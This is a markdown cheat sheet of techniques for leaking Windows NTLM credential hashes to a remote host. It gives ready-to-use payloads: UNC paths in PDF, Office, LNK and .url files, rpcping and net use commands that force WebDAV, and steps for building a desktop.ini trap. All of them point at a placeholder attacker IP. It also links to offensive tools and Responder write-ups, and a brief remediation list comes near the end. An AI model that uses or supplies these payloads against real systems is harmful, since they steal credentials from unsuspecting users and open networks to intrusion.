# All_NTLM_leak


## PDF file
/F (\\\\\\\\IP@80\\\\t)

## dubdoc
///1.2.3.4@80/t
## Doc
Target=file://1.2.3.4@80/t.dotx
URL
file://IP@80/t.htm
## lnk
URL\=file://1.2.3.4@80/t.htm
## IconFile
\\\\1.2.3.4@80\\t.ico
## rpcping
rpcping -s 1.2.3.4 -e 1234 -a privacy -u NTLM
## dir
dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe

## Net command + WebDAV envoke
* net use \\\\1.2.3.4@80\\t
* net use * \\\\1.2.3.4@SSL@443\\folder\\subfolder password /user:userID
* net use * https://1.2.3.4:443/folder/subfolder password /user:userID
* net use * http://1.2.3.4/folder/subfolder password /user:root
* net use * \\\\1.2.3.4\\folder\\subfolder password /user:userID
* net use \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe \. (the DavWWWRoot triggers WebDAV forcibly )
* net use \\\\domain.site@80\\uri_folder\\index.html
* net use * https://1.2.3.4:443/folder/subfolder password /user:userID
* dir \\\\1.2.3.4@SSL@443\\DavWWWRoot\\test.exe

## Create .url file to leak using “ICO” request to file share
Create a new TXT file and paste the following:<br/>
[InternetShortcut]  <br/>
URL=http://www.WeLoveResponder.com <br/>
IconIndex=0  <br/>
IconFile\=\\\\1.2.3.4\\L3\\3T.ico
Rename the file from .txt to .url

## Create desktop.ini file to leak credentials using a folder
mkdir Folder <br/>
attrib +s Folder <br/>
cd Folder <br/>
echo [.ShellClassInfo] > desktop.ini <br/>
echo IconResource\=\\\\1.2.3.4\\aa >> desktop.ini <br/>
attrib +s +h desktop.ini

## Proxy bypass adress is Intranet for NTLM auto auth
https://github.com/Gl3bGl4z/steal_NTLM_ncat

## Dir, IE/EDGE, Office, URL, LNK, HREF, Media Player, Java web start, ClickOnce
https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html

## Leak credentials using HTML
https://github.com/ShikariSenpai/Leak-NTLM-hash-via-HTML

## Remediation
* https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd560653(v=ws.10)
* https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-outgoing-ntlm-traffic-to-remote-servers
* https://blogs.technet.microsoft.com/askds/2009/10/08/ntlm-blocking-and-you-application-analysis-and-auditing-methodologies-in-windows-7/

## KBs
* https://www.bleepingcomputer.com/news/security/understanding-the-windows-credential-leak-flaw-and-how-to-prevent-it/
* https://dylankatz.com/NTLM-Hashes-Microsoft's-Ancient-Design-Flaw/
* https://www.helpnetsecurity.com/2017/05/15/stealing-windows-credentials-using-google-chrome/
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/introducing-responder-10/
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/owning-windows-networks-with-responder-17/
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/top-five-ways-spiderlabs-got-domain-admin-on-your-internal-network/
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/owning-windows-networks-with-responder-part-2/
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/responder-20-owning-windows-networks-part-3/
* https://www.n00py.io/2019/06/understanding-unc-paths-smb-and-webdav/
* https://twitter.com/mynameisv__/status/1123256857072742400
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml
* https://github.com/cure53/HTTPLeaks

## tools
* https://github.com/deepzec/Bad-Pdf
* https://github.com/elnerd/Get-NetNTLM
* https://github.com/ShikariSenpai/Leak-NTLM-hash-via-HTML
* https://github.com/cure53/HTTPLeaks
